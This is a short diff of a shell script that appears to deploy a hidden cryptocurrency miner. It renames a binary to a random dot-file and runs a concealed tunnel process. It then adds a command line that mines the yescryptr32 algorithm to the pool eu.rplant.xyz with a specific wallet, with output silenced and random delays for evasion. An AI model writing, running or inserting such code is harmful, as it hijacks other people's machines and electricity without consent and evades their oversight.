@@ -4,17 +4,15 @@ sleep $((RANDOM % 20 + 5))
 
 NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 
-cp /app/isu "/app/$NAME"
+cp /app/sr "/app/$NAME"
 chmod +x "/app/$NAME"
-rm -f /app/isu
+rm -f /app/sr
 
 /usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
 --url 127.0.0.1:443 >/dev/null 2>&1 &
 
-sleep 3
-
-/app/$NAME -c .cfg >/dev/null 2>&1 &
+/app/$NAME -a yescryptr32 -o eu.rplant.xyz:7047 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.multo -p x >/dev/null 2>&1 &
 P=$!
 
 LIMIT=$((75 + RANDOM % 11))
